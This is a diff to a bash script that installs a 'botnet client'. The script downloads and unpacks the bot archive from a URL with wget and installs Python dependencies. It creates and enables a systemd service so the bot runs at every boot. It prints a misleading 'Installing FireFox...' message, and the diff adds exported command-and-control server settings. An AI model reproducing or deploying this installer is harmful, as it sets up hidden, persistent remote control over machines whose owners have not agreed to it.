@@ -1,6 +1,5 @@
 #!/bin/bash
 
-
 # Create the service allowing the bot to start on computer startup
 createService() {
     filename="botnet.service"
@@ -19,14 +18,15 @@ createService() {
     echo "Service file created successfully."
     
 
-    if [ "$(sudo mv $filename $dest)" -eq 0 ]
+    sudo mv $filename $dest
+    if [ $? -eq 0 ]
     then
         sudo systemctl daemon-reload
         sudo systemctl enable $filename
         sudo systemctl start $filename
         echo "Service installed and started successfully !"
     else
-        echo "Unable to move file ppserver.service into $dest, please retry as sudo"
+        echo "Unable to move file $filename into $dest, please retry as sudo"
     fi
 }
 
@@ -43,12 +43,12 @@ echo "Installing FireFox..."
 # Move to the /tmp folder to download and extract the botnet
 cd /tmp || exit
 wget $botnet_url
-tar -xvf $filename
+unzip $filename
 rm $filename
 
 # Check if python already exists
-is_python=$(which python3)
-if [  "$is_python" -ne 0 ]
+which python3
+if [  $? -ne 0 ]
 then
     # If it does'nt, install it
     sudo apt install python3
@@ -57,8 +57,8 @@ else
 fi
 
 # Check if the python pip module is installed
-is_pip=$(python3 -m pip)
-if [ "$is_pip" -ne 0 ]
+python3 -m pip
+if [ $? -ne 0 ]
 then
     # If it doesn't, install it
     echo "Pip does't exists, installing..."
@@ -72,6 +72,9 @@ mv botnet-client-master $botnet_dest
 cd $botnet_dest || exit
 # Install the required modules
 python3 -m pip install -r requirements.txt
+
+export CENTRAL_SERVER_IP=192.168.1.22
+export CENTRAL_SERVER_PORT=5000
 
 # Create the service to start the botnet
 createService
